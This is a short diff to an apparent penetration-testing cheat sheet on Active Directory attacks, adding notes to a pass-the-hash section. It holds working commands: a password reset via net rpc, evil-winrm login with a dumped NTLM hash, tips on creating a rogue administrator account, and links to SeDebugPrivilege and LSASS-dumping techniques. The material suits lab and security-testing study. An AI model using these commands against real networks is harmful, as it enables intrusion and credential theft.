@@ -140,7 +140,10 @@ net rpc password AUDIT2020 -U BLACKFIELD\\support -S BLACKFIELD.local (prompts n
 **[Pass The Hash](https://swisskyrepo.github.io/InternalAllTheThings/active-directory/hash-pass-the-hash/#references)**
 ```
 evil-winrm -u James -H 8af1903d3c80d3552a84b6ba296db2ea -i 192.168.110.53 (obtain through mimikatz dump)
+  - Sometimes you can compromise the WinRM, and then create a new administrator account to psexec into to access domain.
 ```
+
+**[SeDebugPrivilege Add New Administrative User](https://github.com/bruno-1337/SeDebugPrivilege-Exploit)**
 
 ## Credential Dumping
 **[LSASS Dump - lsass.DMP](https://medium.com/@markmotig/some-ways-to-dump-lsass-exe-c4a75fdc49bf)**
